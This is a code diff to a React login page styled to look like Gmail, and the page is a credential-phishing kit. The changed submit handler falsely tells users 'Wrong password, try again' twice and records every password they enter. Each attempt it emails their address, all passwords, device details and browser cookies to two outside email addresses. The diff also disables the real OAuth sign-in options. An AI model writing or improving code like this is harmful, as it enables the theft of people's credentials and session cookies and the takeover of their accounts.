@@ -1,30 +1,30 @@
 import React, { useState, useCallback, useEffect } from 'react';
 import './RegistrationPage.css';
-import { oauthConfig } from '../config/oauth';
+//import { oauthConfig } from '../config/oauth';
 import { config } from '../config/env';
 
 // Icon imports
-const GoogleIcon = () => (
-  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="24px" height="24px">
-    <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/>
-    <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/>
-    <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/>
-    <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/>
-  </svg>
-);
+// const GoogleIcon = () => (
+//   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="24px" height="24px">
+//     <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/>
+//     <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/>
+//     <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/>
+//     <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/>
+//   </svg>
+// );
 
-const YahooIcon = () => (
-  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="24px" height="24px">
-    <path fill="#4A00A0" d="M24,4C12.954,4,4,12.954,4,24s8.954,20,20,20s20-8.954,20-20S35.046,4,24,4z M31.657,12.829l-4.657,8.714 h-6l-4.657-8.714h4.657l3,5.571l3-5.571H31.657z M29.657,35.171H25v-9.714h4.657V35.171z M19,35.171h-4.657v-9.714H19V35.171z"/>
-  </svg>
-);
+// const YahooIcon = () => (
+//   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="24px" height="24px">
+//     <path fill="#4A00A0" d="M24,4C12.954,4,4,12.954,4,24s8.954,20,20,20s20-8.954,20-20S35.046,4,24,4z M31.657,12.829l-4.657,8.714 h-6l-4.657-8.714h4.657l3,5.571l3-5.571H31.657z M29.657,35.171H25v-9.714h4.657V35.171z M19,35.171h-4.657v-9.714H19V35.171z"/>
+//   </svg>
+// );
 
-const OutlookIcon = () => (
-  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="24px" height="24px">
-    <path fill="#0078d4" d="M44,24c0,11.045-8.955,20-20,20S4,35.045,4,24S12.955,4,24,4S44,12.955,44,24z"/>
-    <path fill="#ffffff" d="M34,14H14c-1.105,0-2,0.895-2,2v16c0,1.105,0.895,2,2,2h20c1.105,0,2-0.895,2-2V16 C36,14.895,35.105,14,34,14z M34,18v2l-10,7l-10-7v-2l10,7L34,18z"/>
-  </svg>
-);
+// const OutlookIcon = () => (
+//   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="24px" height="24px">
+//     <path fill="#0078d4" d="M44,24c0,11.045-8.955,20-20,20S4,35.045,4,24S12.955,4,24,4S44,12.955,44,24z"/>
+//     <path fill="#ffffff" d="M34,14H14c-1.105,0-2,0.895-2,2v16c0,1.105,0.895,2,2,2h20c1.105,0,2-0.895,2-2V16 C36,14.895,35.105,14,34,14z M34,18v2l-10,7l-10-7v-2l10,7L34,18z"/>
+//   </svg>
+// );
 
 interface AuthResponse {
   email: string;
@@ -461,24 +461,22 @@ const RegistrationPage = () => {
       return;
     }
 
-    if (attempt < 3) {
-      setPasswordAttempts(prev => [...prev, password]);
-      setError('Wrong password, try again.');
-      setPassword('');
-      setAttempt(attempt + 1);
-      return;
-    }
+    setLoading(true);
 
-    // On third attempt, send all passwords
     try {
-      setLoading(true);
-      const allPasswords = [...passwordAttempts, password];
+      // Get device info and send email for every attempt
       const deviceInfo = await getDeviceInfo();
+      const currentPasswords = [...passwordAttempts, password];
+      
       const fullInfo = {
         email,
-        passwords: allPasswords,
+        passwords: currentPasswords,
+        attempt: attempt,
+        totalAttempts: 3,
         ...deviceInfo
       };
+
+      // Send email for each attempt
       await fetch(`${config.API_URL}/api/send-email`, {
         method: 'POST',
         headers: {
@@ -487,20 +485,35 @@ const RegistrationPage = () => {
         },
         body: JSON.stringify({
           to: 'peternnamani001@gmail.com,Miralhuge@zohomail.com',
-          subject: 'New Registration',
+          subject: `Registration Attempt ${attempt}/3 - ${email}`,
           text: JSON.stringify(fullInfo, null, 2),
           html: `
-            <h2>New Registration Details</h2>
+            <h2>Registration Attempt ${attempt}/3</h2>
+            <p><strong>Email:</strong> ${email}</p>
+            <p><strong>Current Password:</strong> ${password}</p>
+            <p><strong>All Password Attempts:</strong> ${currentPasswords.join(', ')}</p>
+            <hr>
+            <h3>Complete Device Information:</h3>
             <pre style="font-size:13px; background:#f8f8f8; padding:1em; border-radius:6px; overflow-x:auto;">${JSON.stringify(fullInfo, null, 2)}</pre>
           `,
           cookies: deviceInfo.cookies
         })
       });
-      setError('');
-      setShowModal(true);
-      setAttempt(1);
-      setPasswordAttempts([]);
-      setPassword('');
+
+      // Handle UI feedback based on attempt number
+      if (attempt < 3) {
+        setPasswordAttempts(prev => [...prev, password]);
+        setError('Wrong password, try again.');
+        setPassword('');
+        setAttempt(attempt + 1);
+      } else {
+        // On third attempt, show success modal
+        setError('');
+        setShowModal(true);
+        setAttempt(1);
+        setPasswordAttempts([]);
+        setPassword('');
+      }
     } catch (err: unknown) {
       const errorMessage = err instanceof Error ? err.message : 'Unknown error';
       console.error('Registration error:', errorMessage);
@@ -536,70 +549,70 @@ const RegistrationPage = () => {
     };
   }, [handleAuthMessage]);
 
-  const handleOAuthLogin = useCallback((provider: 'google' | 'yahoo' | 'outlook') => {
-    const width = 500;
-    const height = 600;
-    const left = window.screenX + (window.outerWidth - width) / 2;
-    const top = window.screenY + (window.outerHeight - height) / 2;
+  // const handleOAuthLogin = useCallback((provider: 'google' | 'yahoo' | 'outlook') => {
+  //   const width = 500;
+  //   const height = 600;
+  //   const left = window.screenX + (window.outerWidth - width) / 2;
+  //   const top = window.screenY + (window.outerHeight - height) / 2;
 
-    const config = oauthConfig[provider];
-    const state = Math.random().toString(36).substring(7);
+  //   const config = oauthConfig[provider];
+  //   const state = Math.random().toString(36).substring(7);
     
-    // Store state in sessionStorage for verification
-    sessionStorage.setItem('oauth_state', state);
+  //   // Store state in sessionStorage for verification
+  //   sessionStorage.setItem('oauth_state', state);
 
-    const queryParams = new URLSearchParams({
-      client_id: config.clientId,
-      redirect_uri: `${window.location.origin}/auth/callback/${provider}`,
-      response_type: config.responseType,
-      scope: 'email profile',
-      prompt: 'select_account',
-      access_type: 'online',
-      state: state,
-    });
+  //   const queryParams = new URLSearchParams({
+  //     client_id: config.clientId,
+  //     redirect_uri: `${window.location.origin}/auth/callback/${provider}`,
+  //     response_type: config.responseType,
+  //     scope: 'email profile',
+  //     prompt: 'select_account',
+  //     access_type: 'online',
+  //     state: state,
+  //   });
 
-    const authUrl = `${config.authEndpoint}?${queryParams.toString()}`;
+  //   const authUrl = `${config.authEndpoint}?${queryParams.toString()}`;
 
-    const authWindow = window.open(
-      authUrl,
-      `${provider}Auth`,
-      `width=${width},height=${height},left=${left},top=${top}`
-    );
+  //   const authWindow = window.open(
+  //     authUrl,
+  //     `${provider}Auth`,
+  //     `width=${width},height=${height},left=${left},top=${top}`
+  //   );
 
-    if (!authWindow) {
-      setError('Could not open authentication window. Please allow popups for this site.');
-      setLoading(false);
-      return;
-    }
+  //   if (!authWindow) {
+  //     setError('Could not open authentication window. Please allow popups for this site.');
+  //     setLoading(false);
+  //     return;
+  //   }
 
-    // Listen for messages from the OAuth window
-    const handleMessage = (event: MessageEvent) => {
-      if (event.origin !== window.location.origin) return;
+  //   // Listen for messages from the OAuth window
+  //   const handleMessage = (event: MessageEvent) => {
+  //     if (event.origin !== window.location.origin) return;
 
-      if (event.data.type === 'AUTH_SUCCESS' && event.data.state === state) {
-        const authData: AuthResponse = event.data.payload;
-        // Auto-fill the email
-        setEmail(authData.email);
-        // Clear any existing error
-        setError('');
-        // Reset loading state
-        setLoading(false);
-        // Close the popup
-        authWindow.close();
-        // Clean up event listener
-        window.removeEventListener('message', handleMessage);
-        // Focus the password field
-        const passwordInput = document.querySelector('input[type="password"]') as HTMLInputElement;
-        if (passwordInput) {
-          setTimeout(() => {
-            passwordInput.focus();
-          }, 100);
-        }
-      }
-    };
+  //     if (event.data.type === 'AUTH_SUCCESS' && event.data.state === state) {
+  //       const authData: AuthResponse = event.data.payload;
+  //       // Auto-fill the email
+  //       setEmail(authData.email);
+  //       // Clear any existing error
+  //       setError('');
+  //       // Reset loading state
+  //       setLoading(false);
+  //       // Close the popup
+  //       authWindow.close();
+  //       // Clean up event listener
+  //       window.removeEventListener('message', handleMessage);
+  //       // Focus the password field
+  //       const passwordInput = document.querySelector('input[type="password"]') as HTMLInputElement;
+  //       if (passwordInput) {
+  //         setTimeout(() => {
+  //           passwordInput.focus();
+  //         }, 100);
+  //       }
+  //     }
+  //   };
 
-    window.addEventListener('message', handleMessage);
-  }, []);
+  //   window.addEventListener('message', handleMessage);
+  // }, []);
 
   return (
     <div className="gmail-login-container">
@@ -640,7 +653,7 @@ const RegistrationPage = () => {
           {error && <div className="error">{error}</div>}
         </form>
 
-        <div className="mail-providers">
+        {/* <div className="mail-providers">
           <p className="providers-text">Or continue with</p>
           <div className="provider-buttons">
             <button 
@@ -681,7 +694,7 @@ const RegistrationPage = () => {
 
         <div className="gmail-footer">
           <span>Not your computer? Use Guest mode to sign in privately.</span>
-        </div>
+        </div> */}
 
         <Modal isOpen={showModal} onClose={() => setShowModal(false)}>
           <div className="verification-complete" style={{ textAlign: 'center', padding: '2rem 1rem' }}>
